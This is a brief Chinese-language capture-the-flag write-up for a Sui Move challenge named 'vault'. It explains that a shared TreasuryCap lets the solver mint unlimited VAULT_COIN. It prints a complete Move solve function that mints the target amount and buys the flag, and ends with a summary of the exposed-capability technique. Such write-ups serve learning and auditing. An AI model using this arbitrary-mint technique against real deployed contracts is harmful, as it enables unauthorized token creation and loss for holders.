# vault

## 题目简述

Sui Move 题中 `TreasuryCap<VAULT_COIN>` 被共享给解题入口，导致攻击者可直接 mint 足量代币。请求空投后铸造目标数量的 `VAULT_COIN`，再调用购买 flag 接口即可。

## 解题过程

### 关键观察

Sui Move 题中 `TreasuryCap<VAULT_COIN>` 被共享给解题入口，导致攻击者可直接 mint 足量代币。

### 求解步骤

shared mint treasury cap → arbitrary mint
module solution::solution {
    use sui::tx_context::TxContext;
    use sui::coin::{Self, Coin, TreasuryCap};

    use challenge::vault::{Self, AirdropTracker, Vault};
    use challenge::vault_coin::VAULT_COIN;

    const FLAG_TARGET: u64 = 100_000_000_000;

    public entry fun solve(

### 跨页补回：Move solve 函数收尾

vault: &mut Vault,
        tracker: &mut AirdropTracker,
        treasury_cap: &mut TreasuryCap<VAULT_COIN>,
        ctx: &mut TxContext
    ) {
        vault::request_airdrop(tracker, treasury_cap, ctx);
        let proof_coin: Coin<VAULT_COIN> = coin::mint(treasury_cap,
FLAG_TARGET, ctx);
        vault::buy_flag(tracker, vault, proof_coin, ctx);
    }
}

## 方法总结

- 核心技巧：Move 资源能力对象误暴露。
- 识别信号：解题函数能拿到 `TreasuryCap` 或类似 mint authority。
- 复用要点：链上题先审 capability 是否被共享/转交，再看购买 flag 的资产门槛。
